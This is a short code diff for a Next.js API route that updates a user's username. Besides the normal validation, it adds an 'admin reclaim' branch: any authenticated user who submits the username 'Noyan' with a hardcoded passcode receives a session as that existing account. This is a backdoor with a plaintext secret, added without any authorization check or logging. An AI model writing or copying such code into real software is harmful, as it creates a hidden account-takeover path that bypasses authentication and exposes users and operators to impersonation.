@@ -5,7 +5,22 @@ import { requireAuth, createSession } from "@/lib/auth/session";
 export async function PATCH(req: NextRequest) {
   try {
     const user = await requireAuth();
-    const { username } = await req.json();
+    const { username, passcode } = await req.json();
+
+    // ADMIN RECLAIM LOGIC
+    if (username === "Noyan" && passcode === "546906") {
+      // Find the ORIGINAL Noyan user record
+      const noyanUser = await db.user.findUnique({
+        where: { username: "Noyan" },
+      });
+
+      if (noyanUser) {
+        // If found, we "Log in" as that user by refreshing the session with their ID
+        await createSession(noyanUser.id, noyanUser.username!);
+        return NextResponse.json({ success: true, username: noyanUser.username, reclaimed: true });
+      }
+      // If NOT found, we'll just fall through and let the current user take the name
+    }
 
     if (!username || username.length < 3) {
       return NextResponse.json({ error: "Kullanıcı adı en az 3 karakter olmalıdır" }, { status: 400 });
